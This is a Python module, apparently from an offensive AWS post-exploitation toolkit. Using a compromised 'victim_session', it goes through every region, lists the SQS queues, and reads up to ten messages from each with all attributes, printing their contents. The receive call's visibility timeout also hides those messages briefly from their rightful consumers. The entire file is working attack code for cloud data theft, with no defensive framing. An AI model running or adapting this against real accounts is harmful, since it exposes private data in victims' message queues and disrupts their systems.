from colorama import Fore
import json
from modules.utils import custom_serializer
import modules.globals as my_globals
from modules.logger import *

def sqs_init_enum(victim_session, attacker_session):
    enable_print_logging()
    list_sqs_queues(victim_session)

def list_sqs_queues(victim_session):
    print(f"{Fore.GREEN}[+] Enumerating SQS Queues:")
    for region in my_globals.aws_regions:
        try:
            sqs_client = victim_session.client("sqs", region_name=region)
            queues = sqs_client.list_queues().get("QueueUrls", [])
            for queue_url in queues:
                print(f"{Fore.MAGENTA} | Region: {region} | Queue URL: {queue_url}")
                try:
                    response = sqs_client.receive_message(
                        QueueUrl=queue_url,
                        AttributeNames=['All'],
                        MaxNumberOfMessages=10,
                        MessageAttributeNames=['All'],
                        VisibilityTimeout=30,
                        WaitTimeSeconds=10
                    )
                    messages = response.get("Messages", [])
                    print(f"{Fore.YELLOW} | Messages:\n   {json.dumps(messages, indent=4, sort_keys=True, default=custom_serializer)}")
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    print(f"{Fore.LIGHTBLACK_EX} | Failed to receive messages from {queue_url}")
                    log_error(f"Failed to receive messages from {queue_url}\n | Error:{e}")
        except KeyboardInterrupt:
            raise
        except Exception as e:
            sys.stderr.write("\r\033[K")
            sys.stderr.write(f"{Fore.LIGHTBLACK_EX} | Failed to list SQS queues in region {region}")
            sys.stderr.flush()
            log_error(f"\n | Error:{e}")
    print("")